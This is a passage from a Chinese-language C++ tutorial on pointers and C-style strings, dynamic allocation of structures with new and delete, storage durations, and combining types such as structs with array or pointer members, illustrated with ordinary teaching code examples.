<code>delete</code> (对应 <code>new</code>) 或 <code>delete[]</code> (对应 <code>new[]</code>) 释放。</li><li> <strong>危险:</strong> 未初始化指针、空指针解引用、悬挂指针、内存泄漏、错误的 <code>delete</code>/<code>delete[]</code> 使用。</li><li> <strong>指针本身 vs 指向的值:</strong> <code>pointerName</code> 存储的是地址，<code>*pointerName</code> 是该地址处的值。</li></ol><h3 id="4-8-3-指针和字符串"><a href="#4-8-3-指针和字符串" class="headerlink" title="4.8.3 指针和字符串"></a>4.8.3 指针和字符串</h3><p>C 风格字符串本质上是 <code>char</code> 类型的数组，以空字符 <code>\0</code> 结尾。因此，指针在处理 C 风格字符串时非常常用。</p><ul><li>  <strong>字符串字面值:</strong> 字符串字面值（如 <code>&quot;Hello&quot;</code>) 在内存中存储为 <code>const char</code> 数组，并以 <code>\0</code> 结尾。字符串字面值本身可以被当作指向其第一个字符的 <code>const char*</code> 指针。</li><li>  <strong><code>char</code> 指针:</strong> 可以声明 <code>char*</code> 或 <code>const char*</code> 指针来指向 C 风格字符串。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strlen()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> animal[<span class="number">20</span>] = <span class="string">&quot;bear&quot;</span>; <span class="comment">// animal 是 char 数组</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *bird = <span class="string">&quot;wren&quot;</span>; <span class="comment">// bird 是指向 &quot;wren&quot; 字符串字面值第一个字符 &#x27;w&#x27; 的指针</span></span><br><span class="line">    <span class="keyword">char</span> *p_animal; <span class="comment">// 未初始化的 char 指针</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; animal &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; bird &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// cout 知道如何处理 char* (打印直到 \0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针指向数组</span></span><br><span class="line">    p_animal = animal; <span class="comment">// p_animal 指向 animal 数组的第一个字符 &#x27;b&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer p_animal points to: &quot;</span> &lt;&lt; p_animal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;bear&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问字符串内容</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char via array: &quot;</span> &lt;&lt; animal[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// b</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char via pointer: &quot;</span> &lt;&lt; *p_animal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// b</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针算术遍历字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using pointer arithmetic:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p_bird = bird;</span><br><span class="line">    <span class="keyword">while</span> (*p_bird != <span class="string">&#x27;\0&#x27;</span>) &#123; <span class="comment">// 循环直到遇到空字符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p_bird &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        p_bird++; <span class="comment">// 指针移动到下一个字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 字符串字面值和指针</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p_literal = <span class="string">&quot;This is a literal&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p_literal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// p_literal[0] = &#x27;t&#x27;; // 错误! 字符串字面值通常是只读的 (const char*)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 动态分配字符串</span></span><br><span class="line">    <span class="keyword">char</span> *p_dynamic_str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(<span class="string">&quot;Dynamic String&quot;</span>) + <span class="number">1</span>]; <span class="comment">// +1 为了空字符</span></span><br><span class="line">    <span class="built_in">strcpy</span>(p_dynamic_str, <span class="string">&quot;Dynamic String&quot;</span>); <span class="comment">// 使用 strcpy 复制 (不安全，最好用 strncpy 或 C++ string)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic string: &quot;</span> &lt;&lt; p_dynamic_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span> [] p_dynamic_str; <span class="comment">// 释放动态分配的数组</span></span><br><span class="line">    p_dynamic_str = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong></p><ul><li>  <code>cout</code> 对 <code>char*</code> 有特殊处理，它会打印从指针指向地址开始直到遇到空字符 <code>\0</code> 的所有字符。</li><li>  修改字符串字面值是未定义行为，应使用 <code>const char*</code> 指向它们。</li><li>  处理 C 风格字符串时要特别注意缓冲区溢出问题（例如使用 <code>strcpy</code> 时目标数组不够大），并确保字符串以 <code>\0</code> 结尾。<code>std::string</code> 类通常是更安全、更方便的选择。</li></ul><h3 id="4-8-4-使用new创建动态结构"><a href="#4-8-4-使用new创建动态结构" class="headerlink" title="4.8.4 使用new创建动态结构"></a>4.8.4 使用new创建动态结构</h3><p>就像可以动态分配基本类型和数组一样，也可以使用 <code>new</code> 动态创建结构体（或类）对象。</p><p><strong>分配:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StructureName * pointerVariable = <span class="keyword">new</span> StructureName;</span><br></pre></td></tr></table></figure><p>这会在自由存储区分配足够存储 <code>StructureName</code> 结构所有成员的内存，并调用该结构的<strong>构造函数</strong>（如果是类或有构造函数的结构），然后返回指向新创建结构的指针。</p><p><strong>访问成员:</strong></p><p>当通过指针访问结构或类的成员时，不能直接使用点运算符 <code>.</code>。有两种方式：</p><ol><li> <strong>解引用再用点 (<code>(*ptr).member</code>)</strong>: 先解引用指针 <code>*ptr</code> 得到结构本身，然后使用点运算符访问成员。括号是必需的，因为点运算符的优先级高于解引用运算符。</li><li> <strong>箭头运算符 (<code>ptr-&gt;member</code>)</strong>: 这是更常用、更简洁的方式。箭头运算符 <code>-&gt;</code> 专门用于通过指针访问其指向的结构或类的成员。<code>ptr-&gt;member</code> 完全等价于 <code>(*ptr).member</code>。</li></ol><p><strong>释放:</strong></p><p>使用 <code>delete</code> 释放由 <code>new</code> 创建的单个结构对象。<code>delete</code> 会先调用该对象的<strong>析构函数</strong>（如果需要），然后释放内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> pointerVariable;</span><br><span class="line">pointerVariable = <span class="literal">nullptr</span>; <span class="comment">// 好习惯</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Inflatable</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">float</span> volume;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 动态创建 Inflatable 结构</span></span><br><span class="line">    Inflatable *ps = <span class="keyword">new</span> Inflatable; <span class="comment">// 在自由存储区创建结构</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问成员</span></span><br><span class="line">    <span class="comment">// 方法 1: 解引用和点运算符</span></span><br><span class="line">    (*ps).name = <span class="string">&quot;Dynamic Floatie&quot;</span>;</span><br><span class="line">    (*ps).volume = <span class="number">1.5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法 2: 箭头运算符 (更常用)</span></span><br><span class="line">    ps-&gt;price = <span class="number">29.99</span>; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically created structure:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Name: &quot;</span> &lt;&lt; ps-&gt;name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Volume: &quot;</span> &lt;&lt; (*ps).volume &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 两种方式都可以用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Price: &quot;</span> &lt;&lt; ps-&gt;price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Address: &quot;</span> &lt;&lt; ps &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放动态创建的结构</span></span><br><span class="line">    <span class="keyword">delete</span> ps;</span><br><span class="line">    ps = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Structure deleted.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-8-5-自动存储、静态存储和动态存储"><a href="#4-8-5-自动存储、静态存储和动态存储" class="headerlink" title="4.8.5 自动存储、静态存储和动态存储"></a>4.8.5 自动存储、静态存储和动态存储</h3><p>C++ 程序中的变量和数据根据其内存分配方式和生命周期，可以分为三种主要的存储类别：</p><ol><li><p><strong>自动存储持续性 (Automatic Storage Duration):</strong></p><ul><li>  <strong>内存区域:</strong> 通常在称为<strong>栈 (Stack)</strong> 的内存区域分配。</li><li>  <strong>分配/释放:</strong> 内存的分配和释放在函数（或代码块）进入和退出时自动进行。</li><li>  <strong>生命周期:</strong> 变量在声明它的函数或代码块执行期间存在，块结束时自动销毁。</li><li>  <strong>例子:</strong> 函数内部声明的非 <code>static</code> 局部变量（包括函数参数）。</li><li>  <strong>特点:</strong> 分配和释放速度快，管理简单（自动），但空间有限，生命周期受限于作用域。</li></ul></li><li><p><strong>静态存储持续性 (Static Storage Duration):</strong></p><ul><li>  <strong>内存区域:</strong> 在程序的整个生命周期内都存在于内存的某个固定区域（通常是静态/全局数据区）。</li><li>  <strong>分配/释放:</strong> 内存在程序启动时分配（或首次使用时，对于某些静态变量），在程序结束时释放。</li><li>  <strong>生命周期:</strong> 从程序开始执行到程序结束。</li><li>  <strong>例子:</strong> 在函数外部声明的变量（全局变量）、使用 <code>static</code> 关键字在函数内部或类内部声明的变量。</li><li>  <strong>特点:</strong> 生命周期长，可以跨函数调用保持其值，但全局变量可能导致命名冲突和管理复杂性。</li></ul></li><li><p><strong>动态存储持续性 (Dynamic Storage Duration):</strong></p><ul><li>  <strong>内存区域:</strong> 在称为<strong>自由存储区 (Free Store)</strong> 或 <strong>堆 (Heap)</strong> 的内存区域分配。</li><li>  <strong>分配/释放:</strong> 内存由程序员使用 <code>new</code> (或 <code>malloc</code> 等 C 函数) 显式分配，并且<strong>必须</strong>使用 <code>delete</code> (或 <code>free</code>) 显式释放。</li><li>  <strong>生命周期:</strong> 从 <code>new</code> 分配成功开始，直到程序员使用 <code>delete</code> 释放为止。生命周期与函数或代码块的作用域无关。</li><li>  <strong>例子:</strong> 使用 <code>new</code> 创建的变量、数组或对象。</li><li>  <strong>特点:</strong> 提供了最大的灵活性，可以在运行时根据需要分配任意大小的内存，生命周期由程序员控制。但管理复杂，容易出现内存泄漏（忘记 <code>delete</code>）或悬挂指针（<code>delete</code> 后仍使用指针）等问题。</li></ul></li></ol><p><strong>示例对比:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_static_var = <span class="number">10</span>; <span class="comment">// 静态存储 (全局)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> file_static_var = <span class="number">20</span>; <span class="comment">// 静态存储 (文件作用域)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> auto_var = <span class="number">30</span>; <span class="comment">// 自动存储 (栈)</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> func_static_var = <span class="number">40</span>; <span class="comment">// 静态存储 (函数作用域，只初始化一次)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *dynamic_var = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">50</span>); <span class="comment">// 动态存储 (堆)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Inside func:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  auto_var address: &quot;</span> &lt;&lt; &amp;auto_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; auto_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  func_static_var address: &quot;</span> &lt;&lt; &amp;func_static_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; ++func_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  dynamic_var address: &quot;</span> &lt;&lt; dynamic_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; *dynamic_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">delete</span> dynamic_var; <span class="comment">// 必须手动释放动态内存</span></span><br><span class="line">    dynamic_var = <span class="literal">nullptr</span>;</span><br><span class="line">&#125; <span class="comment">// auto_var 在这里销毁</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Global static var address: &quot;</span> &lt;&lt; &amp;global_static_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; global_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File static var address: &quot;</span> &lt;&lt; &amp;file_static_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; file_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling func first time:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    func();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling func second time:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    func(); <span class="comment">// 注意 func_static_var 的值会保持</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int* dangling_ptr;</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     int temp_auto = 100; // 自动存储</span></span><br><span class="line">    <span class="comment">//     dangling_ptr = &amp;temp_auto;</span></span><br><span class="line">    <span class="comment">// &#125; // temp_auto 销毁</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; *dangling_ptr; // 错误! 悬挂指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解这三种存储方式对于编写健壮、高效且无内存错误的 C++ 程序至关重要。现代 C++ 倾向于使用 RAII (Resource Acquisition Is Initialization) 技术和智能指针（如 <code>std::unique_ptr</code>, <code>std::shared_ptr</code>）来自动管理动态内存，以减少手动 <code>new</code>/<code>delete</code> 带来的风险。</p><h2 id="4-9-类型组合"><a href="#4-9-类型组合" class="headerlink" title="4.9 类型组合"></a>4.9 类型组合</h2><p>C++ 的强大之处在于其类型系统允许你将基本类型、复合类型（数组、结构、共用体、枚举）和指针以多种方式组合起来，创建更复杂的数据结构来精确地模拟现实世界的问题。</p><p>本章我们已经接触了一些组合：</p><ul><li>  <strong>结构数组 (Array of Structures):</strong> 数组的每个元素都是一个结构体 (见 4.4.5)。</li><li>  <strong>结构包含 <code>std::string</code> 成员:</strong> 结构体可以包含类类型的成员 (见 4.4.3)。</li><li>  <strong>指针指向结构:</strong> 可以声明指向结构体对象的指针 (见 4.8.4)。</li><li>  <strong>指针指向数组 (或数组名视为指针):</strong> 指针可以用来操作数组 (见 4.8.1)。</li></ul><p>本节将进一步探讨一些常见的类型组合方式。</p><p><strong>1. 结构包含数组成员:</strong></p><p>结构体可以包含数组作为其成员。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StudentGrades</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> studentName;</span><br><span class="line">    <span class="keyword">int</span> grades[<span class="number">5</span>]; <span class="comment">// 包含一个 int 数组作为成员</span></span><br><span class="line">    <span class="keyword">int</span> numGrades; <span class="comment">// 记录实际存储的成绩数量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StudentGrades alice;</span><br><span class="line">    alice.studentName = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    alice.grades[<span class="number">0</span>] = <span class="number">95</span>;</span><br><span class="line">    alice.grades[<span class="number">1</span>] = <span class="number">88</span>;</span><br><span class="line">    alice.grades[<span class="number">2</span>] = <span class="number">92</span>;</span><br><span class="line">    alice.numGrades = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; alice.studentName &lt;&lt; <span class="string">&quot;&#x27;s first grade: &quot;</span> &lt;&lt; alice.grades[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; alice.numGrades; ++i) &#123;</span><br><span class="line">        sum += alice.grades[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (alice.numGrades &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average grade: &quot;</span> &lt;&lt; sum / alice.numGrades &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. 结构包含指针成员:</strong></p><p>结构体可以包含指针作为成员。这常用于指向动态分配的内存或指向其他数据结构。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DynamicData</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> label;</span><br><span class="line">    <span class="keyword">int</span>* data_ptr; <span class="comment">// 指向动态分配的 int 数组</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DynamicData myData;</span><br><span class="line">    myData.label = <span class="string">&quot;Sensor Readings&quot;</span>;</span><br><span class="line">    myData.size = <span class="number">10</span>;</span><br><span class="line">    myData.data_ptr = <span class="keyword">new</span> <span class="keyword">int</span>[myData.size]; <span class="comment">// 动态分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化动态数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; myData.size; ++i) &#123;</span><br><span class="line">        myData.data_ptr[i] = i * i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Label: &quot;</span> &lt;&lt; myData.label &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data at index 3: &quot;</span> &lt;&lt; myData.data_ptr[<span class="number">3</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// **重要:** 必须手动释放指针成员指向的动态内存</span></span><br><span class="line">    <span class="keyword">delete</span> [] myData.data_ptr; </span><br><span class="line">    myData.data_ptr = <span class="literal">nullptr</span>; <span class="comment">// 避免悬挂指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 当结构包含指针成员指向动态内存时，需要特别注意内存管理（复制、赋值、析构），这通常涉及到类的特殊成员函数（拷贝构造函数、拷贝赋值运算符、析构函数），我们将在后续章节深入学习。</p><p><strong>3. 指针数组 (Array of Pointers):</strong></p><p>可以创建数组，其每个元素都是一个指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>, c = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">int</span>* ptr_array[<span class="number">3</span>]; <span class="comment">// 声明一个包含 3 个 int* 